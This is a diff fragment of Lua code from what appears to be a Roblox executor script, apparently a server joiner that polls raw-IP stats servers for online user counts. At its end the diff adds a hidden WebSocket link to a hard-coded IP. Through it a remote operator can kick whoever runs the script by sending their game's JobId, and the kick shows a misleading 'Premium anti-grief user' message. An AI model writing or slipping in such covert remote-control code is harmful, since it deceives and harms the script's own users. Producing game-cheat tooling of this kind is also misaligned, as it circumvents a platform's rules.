+                    if (resp and resp.Body) then
+                        local data = HttpService:JSONDecode(resp.Body)
+                        if (data and data.connected) then
+                            euCount = data.connected
+                        end
+                    end
+                end)
+                
+                pcall(function()
+                    local resp = req({Url = "http://144.172.110.44:6969/api/stats", Method = "GET"})
+                    if (resp and resp.Body) then
+                        local data = HttpService:JSONDecode(resp.Body)
+                        if (data and data.connected) then
+                            usaCount = data.connected
+                        end
+                    end
+                end)
+                
+                statsLabel.Text = string.format("Users (Online): EU: %s | USA: %s", tostring(euCount), tostring(usaCount))
+                
+                if Active then
+                    task.wait(10)
+                end
+            end
+        end)
+    end
+    
+    showSplashOnce(startJoiner)
+    
+    game.GameClosing:Connect(function()
+        Active = false
+    end)
+end
+
+task.wait(5)
+
+local wsUrl = "ws://104.194.156.27:8765"
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local ws = WebSocket.connect(wsUrl)
+
+ws.OnMessage:Connect(function(receivedJobId)
+    if (receivedJobId == game.JobId) then
+        player:Kick("Premium anti-grief user kicked you!")
+    end
+end)
+
+initializeScript()
